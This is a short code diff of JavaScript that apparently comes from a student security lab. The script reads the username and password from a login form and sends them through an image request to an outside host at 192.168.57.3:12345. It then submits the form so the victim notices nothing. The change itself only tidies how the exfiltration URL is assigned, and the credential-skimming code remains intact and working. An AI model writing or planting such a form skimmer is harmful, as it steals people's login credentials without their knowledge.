@@ -55,7 +55,7 @@
         var login_password = document.getElementsByName('login_password')[0].value;
         var url = "http://192.168.57.3:12345?payload=" + login_username + "," + login_password + "&roll=14026&random=" + Math.random() + "&timestamp=" + Math.floor(Date.now());
         var image = new Image();
-        image.src="http://192.168.57.3:12345?payload=" + login_username + "," + login_password + "&roll=14026&random=" + Math.random() + "&timestamp=" + Math.floor(Date.now());
+        image.src = url;
         image.onerror = function(){
             document.getElementById('loginform').submit();
         }
